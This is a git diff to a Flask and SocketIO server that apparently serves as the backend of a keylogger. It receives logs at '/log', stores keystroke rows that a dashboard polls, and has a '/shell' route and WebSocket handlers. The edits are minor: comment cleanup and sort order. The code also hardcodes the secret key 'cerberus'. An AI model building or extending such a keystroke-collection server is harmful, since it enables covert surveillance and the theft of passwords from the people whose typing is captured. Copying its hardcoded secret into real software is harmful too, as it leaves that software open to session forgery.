@@ -5,9 +5,9 @@ from pathlib import Path
 from flask_socketio import SocketIO, emit
 
 
-app = Flask(__name__)
-app.config["SECRET_KEY"] = "cerberus"
-socketio = SocketIO(app)
+app = Flask(__name__) 
+app.config["SECRET_KEY"] = "cerberus" # secret key yoav!!
+socketio = SocketIO(app) 
 
 BASE_DIR = Path(__file__).resolve().parent
 DB_PATH  = BASE_DIR / "database" / "logs.db"
@@ -39,7 +39,7 @@ def init_db():
     db.close()
 
 
-# ── Routes ────────────────────────────────────────────────────────────────────
+# Routes
 
 @app.route("/log", methods=["POST"])
 def receive_log():
@@ -67,7 +67,7 @@ def receive_log():
 def api_logs():
     """Returns all keystroke rows as JSON for the dashboard's JS polling."""
     db   = get_db()
-    rows = db.execute("SELECT * FROM keystrokes ORDER BY id ASC").fetchall()
+    rows = db.execute("SELECT * FROM keystrokes ORDER BY id DESC").fetchall()
     db.close()
     return jsonify([dict(row) for row in rows])
 
@@ -83,7 +83,7 @@ def shell():
     return redirect("/")
 
 
-# ── WebSocket events ──────────────────────────────────────────────────────────
+# WebSocket events
 
 @socketio.on("connect")
 def on_connect():
